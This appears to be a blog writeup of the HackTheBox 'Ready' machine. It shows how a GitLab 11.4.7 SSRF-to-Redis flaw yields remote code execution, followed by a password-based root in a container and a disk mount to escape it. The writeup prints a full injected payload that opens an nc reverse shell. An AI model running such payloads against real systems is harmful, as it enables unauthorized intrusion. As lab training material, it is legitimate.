---
title: Ready Hackthebox Writeup
date: 2021-05-15 09:00:00 +0530
categories: [Hackthebox, Active]
tags: [linux,container,gitlab,ssrf,rce,gitlab 11.4.7,medium,hackthebox,ready]     # TAG names should always be lowercase
image: /assets/img/ready-hackthebox/ready-pic.jpg
subtitle: JHBDOcubeoveiubo
---


# Introduction@Ready:~$


Column | Details
------------ | -------------
Name | Ready
IP | 10.10.10.220
Points | 30
Os | Linux
Difficult | Medium
Creator | [bertolis](https://app.hackthebox.eu/users/27897)
Out on | 28th November 2020

# Summary:~$

* Discovering the new host and scanning for open ports.
* Logging in `Port 5080`, which is a `gitlab` signup/signin page.
* Checking the gitlab version, which is `11.4.7`
* Looking for vulnerabilities for that version, found `SSRF - redis - RCE` in gitlab 11.4.7.
* Exploiting the `vulnerability` and getting the `reverse shell`.
* For `Privilege escalation`, found a password file and logged in as `root` in the container.
* **Mounting** the drives present in `/dev` of the container, to get the `Root Flag`.

# Starting:~$

## Nmap

I have used **nmapAutomator** , which keeps the scanning fast and reduces effort.*(Not recommended in real life scenarios).* 

Dowload link: [nmapAutomator](https://github.com/21y4d/nmapAutomator)

___
![](/assets/img/ready-hackthebox/nmap-automator-2.png)

I accessed port `5080` which shows a gitlab login and signup page.

___
![](/assets/img/ready-hackthebox/accessing-port-5080-3.png)

Along with that I also checked the `/robots.txt`.

___
![](/assets/img/ready-hackthebox/accessing-robots-txt-4.png)

There are a lot of directories but let's first `signup` and then `login`.

___
![](/assets/img/ready-hackthebox/registering-5.png)

The following page is displayed after logging in

___
![](/assets/img/ready-hackthebox/signed-in-6.png)

In such cases, first thing I do is to check the `version` of **Gitlab**. After checking the `help` option in menu, I got this

___
![](/assets/img/ready-hackthebox/help-section-version-7.png)

I googled a bit and got to know that `Gitlab` version `11.4.7` is vulnerable to `RCE via SSRF`.

I found a [`Git Repository`](https://github.com/jas502n/gitlab-SSRF-redis-RCE) and [`Live Overflow`](https://www.youtube.com/watch?v=LrLJuyAdoAg) also explained it in one of his videos.

Now creating a new `Project` in Gitlab by importing it via `git Repo byURL`.

___
![](/assets/img/ready-hackthebox/import-project-by-git-URL-12.png)

Now before pressing the `save` button, setting up proxy and turn on the interceptor on `Burp`.

After `Intercepting` the request, let's replace `import_url` parameter by the following payload:

```

git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|nc -e /bin/bash IP PORT\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
 exec
 exec
/ssrf.git

```
Make sure to check the [POC](https://github.com/jas502n/gitlab-SSRF-redis-RCE) for `RCE via SSRF`, I got the above payload after making some changes. (*Make sure you check the gaps specified in the POC, or else the playload won't work **It didn't work in my case** .*)

___
![](/assets/img/ready-hackthebox/final-req-16.png)

After listening on port 1234, I got a `Reverse shell` as `git`, converted it to an [interactive shell](https://netsec.ws/?p=337)

___
![](/assets/img/ready-hackthebox/tty-shell-19.png)

Got `User Flag`.

___
![](/assets/img/ready-hackthebox/got-user-txt-20.png)

For `Privilege Escalation` I started with manual enumeration and got a `backup folder` in `/opt` directory.
It contained 3 files i.e. 
1. gitlab-secrets.json
2. gitlab.rb
3. docker-compose.yml

After having a look at each of these files, I found that `gitlab.rb` contained some `passwords`.

___
![](/assets/img/ready-hackthebox/few-passwords-23.png)

Simultaneously trying each password, `wW59U!ZKMbG9+*#h` one worked for **sudo su**.

___
![](/assets/img/ready-hackthebox/became-root-but-not-root-text-24.png)

After becoming root, I tried finding out the `root.txt` but there wasn't any because we are in a **container** as *root*.

___
![](/assets/img/ready-hackthebox/no-root-text.png)

After reading this blog on [Unprivileged container builds](https://kinvolk.io/blog/2018/04/towards-unprivileged-container-builds/), I tried the `new mount` technique, but before proceeding further I cheked which drives are present in `/dev` directory with the name of `sda`.

___
![](/assets/img/ready-hackthebox/dev-sda-command-25.png)

There are 4 sda disks present, with the following names:
1. sda
2. sda1
3. sda2
4. sda3

I tried mounting all of them but only `sda2` worked.

___
![](/assets/img/ready-hackthebox/only-sda-test3-worked-27.png)

Entering the `test-sda2` folder and accessing the `root` directory, I got the `Root Flag`.

___
![](/assets/img/ready-hackthebox/got-root-flag-28.png)

___
